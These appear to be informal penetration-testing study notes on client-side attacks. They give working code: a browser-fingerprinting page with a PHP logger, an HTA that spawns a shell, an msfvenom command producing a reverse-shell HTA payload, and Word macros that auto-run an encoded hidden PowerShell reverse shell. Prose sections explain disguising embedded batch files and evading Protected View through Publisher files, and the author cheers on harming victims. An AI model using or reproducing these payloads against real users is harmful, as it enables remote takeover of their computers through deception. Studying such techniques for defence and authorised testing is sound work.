FINGERPRINTING A VICTIM:
on your webserver in Kali:
<!doctype html>
<html>
<head>
  <title>Blank Page</title>
</head>
<body>
  <h1>You have been given the finger!</h1>
  <script src="fingerprint2.js"></script>
  <script>
      var d1 = new Date();
      var options = {};
      Fingerprint2.get(options, function (components) {
        var values = components.map(function (component) { return component.value })
        var murmur = Fingerprint2.x64hash128(values.join(''), 31)
	      var clientfp = "Client browser fingerprint: " + murmur + "\n\n";
        var d2 = new Date();
        var timeString = "Time to calculate fingerprint: " + (d2 - d1) + "ms\n\n";
        var details = "Detailed information: \n";
        if(typeof window.console !== "undefined") {
          for (var index in components) {
            var obj = components[index];
            var value = obj.value;
	          if (value !== null) {
              var line = obj.key + " = " + value.toString().substr(0, 150);
              details += line + "\n";
	          }
          }
        }
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.open("POST", "/js.php");
        xmlhttp.setRequestHeader("Content-Type", "application/txt");
        xmlhttp.send(clientfp + timeString + details);
      });
  </script>
</body>
</html>

put in /fp/js.php:
<?php
$data = "Client IP Address: " . $_SERVER['REMOTE_ADDR'] . "\n";
$data .= file_get_contents('php://input');
$data .= "---------------------------------\n\n";
file_put_contents('/var/www/html/fp/fingerprint.txt', print_r($data, true), FILE_APPEND | LOCK_EX);
?>

This code will produce a victim's browser fingerprint including OS and plugins 
when clicked. Using this as part of an SE attack is a great way to easily and
quickly enumerate a target. 

HTML Applications:
HTML Applications have the extension .hta, but are run by Internet Explorer
like regular html when encountered. This is done in an attempt to allow 
executables to be run from browser as opposed to having the client
download them and run them of their own accord. mshta.exe is the program
that tries to run these on Windows devices, and Internet Explorer will
always try to do it by default (lmao). If mshta.exe is allowed to run without
issue, an attacker can run arbitrary code with the users permissions. 
THIS ONLY WORKS FOR IEXE and Microsoft Edge (to an extent).

.hta files have <html>, <body> and <script> tags but they are filled with 
JavaScript or VBScript code. Below is a basic .hta that will open a shell
on the computer of the person who opens the file, and then closes the cmd
window so the process is not left in GUI:

<html>
<head>

<script>

  var c= 'cmd.exe'
  new ActiveXObject('WScript.Shell').Run(c);
  
</script>

</head>
<body>

<script>
  
  self.close();
    
</script>
  
</body>
</html>

Unsurprisingly, msfvenom has an hta-psh output format that will allow us
to create an HTA PowerShell payload:

kali@kali:~$ sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of hta-psh file: 6461 bytes
Saved as: /var/www/html/evil.hta

This payload does a couple of things to prevent detection and make it easier to 
compromise the target. The variable names are randomized so AV doesn't detect
any suspicious variable names. There is also a PowerShell argument -nop
which stands for -NoProfile and tells PowerShell to not load the PS User profile.
This prevents user scripts from automatically running when PS is started,
preventing any interference with our exploit. -w hidden is another common 
powershell startup command that prevents a window from opening when the process
starts. 
Also the command is encoded with -e... duh.
You can catch this with Netcat

MICROSOFT OFFICE:
You can really fuck people's lives up with Microsoft Word Macros. The best
part about Microsoft Word macros is that you can write them from scratch 
using VisualBasic for Applications (VBA). VBA Scripts are ez. Creating a new 
Macro in a Word Doc is also ez, just go to View > Macros and click "Create".

Macros consist of at least 1 VBA Sub, which is different from a funtion because
it doesn't return any values. We can abuse ActiveX to give us a shell through a
Macro as well like this:

Sub MyMacro()
	CreateObject("Wscript.Shell").Run "cmd"
End Sub

We combine these with two other procedures to get a Macro that will execute 
upon every opening of the document:

Sub AutoOpen()
  MyMacro
End Sub
Sub Document_Open()
  MyMacro
End Sub
Sub MyMacro()
  CreateObject("Wscript.Shell").Run "cmd"
End Sub

.docx DOES NOT SUPPORT MACROS so you have to save as .docm or .doc in order 
for these macros to work. You are relying on the target to enable macros 
without knowing the danger of their enablement. A pretext or significant
ignorance on the victim's behalf are required to get this to happen.

To get a reverse shell, we are going to want to complete an encoded command
through powershell. However, VBA has a 255 character limit on literal strings
so everything has to be broken up:

Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
    Str = Str + "QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB"
    Str = Str + "TAHQAcgBlAGEAbQAoACwAWwBDAG8AbgB2AGUAcgB0AF0AOgA6A"
    Str = Str + "EYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAEg"
    Str = Str + "ANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEATAAxAFgANgAyACsAY"
    Str = Str + "gBTAEIARAAvAG4ARQBqADUASAAvAGgAZwBDAFoAQwBJAFoAUgB"
    ...
    Str = Str + "AZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0Ac"
    Str = Str + "AByAGUAcwBzACkADQAKACQAcwB0AHIAZQBhAG0AIAA9ACAATgB"
    Str = Str + "lAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtA"
    Str = Str + "FIAZQBhAGQAZQByACgAJABnAHoAaQBwACkADQAKAGkAZQB4ACA"
    Str = Str + "AJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAVABvAEUAbgBkACgAK"
    Str = Str + "QA="

    CreateObject("Wscript.Shell").Run Str
End Sub

Saving, closing and reopening the word doc will give you a shell you 
can catch with nc or another utility.


OBJECT LINKING AND EMBEDDING:
Another SE exploit we can leverage against Microsoft abuses the
Dynamic Data Exchange (DDE) to execute arbitrary commands from within
Microsoft Office Documents. This feature has been patched since 2017
but we can still use Object Linking and Embedding (OLE) to get the 
results we want. We can do things such as embedding a batch file into
a Microsoft Word Document. The Insert > Object option is what lets us
do this in Microsoft. Create from file will let us embed the batch 
script, which is then presented to the viewer of the document as a clickable
object. We can change the icon and name of the object so it doesn't 
look like a batch file anymore too! Now it's just an excel document
that you can access from the Word Doc that doesn't have anything 
to do with getting reverse shell on your shit!

There is still a security warning on the file opener, and we have to 
trick the target into allowing it but that is common practice for
SE pros.

PROTECTED VIEW BYPASS:
When you serve a file with macros or ole over the internet, Windows 
notices this, and will open the file in "protected view" This disables 
all editing, modifications, macros, objects etc from the document. 
No fun allowed! Bullshit. Fortunately, this is not the default opening
method on Microsoft Publisher! If you can enum Publisher on the target, 
send them a publisher file and they will open in regular view aka pwnview.